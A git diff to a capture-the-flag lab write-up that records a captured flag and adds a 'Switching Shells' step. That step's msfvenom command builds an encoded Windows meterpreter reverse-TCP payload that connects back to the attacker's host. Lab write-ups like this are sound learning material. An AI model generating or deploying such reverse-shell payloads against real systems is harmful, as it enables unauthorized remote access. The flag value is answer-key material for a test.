@@ -29,8 +29,11 @@ So, after some reasearch, I understood that the script must be written in groovy
 ![image](https://github.com/user-attachments/assets/3a615248-071f-41f6-af7e-c5e7cf7928a6)<br />
 So I was able to get the flag: <br />
 ![image](https://github.com/user-attachments/assets/5afb69d9-8d50-444e-87e0-a0914bd790de)<br />
-`79007a09481963edf2e1321abd9ae2a0`  
+`79007a09481963edf2e1321abd9ae2a0`
+
+
 ### Switching Shells
+Now we want to upgrade the shell to a meterpreter shell using the following command `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=YOUR_IP LPORT=YOUR_PORT -f exe -o shell-name.exe`.
 - What is the final size of the exe payload that you generated?
 
 ### Privilege Escalation
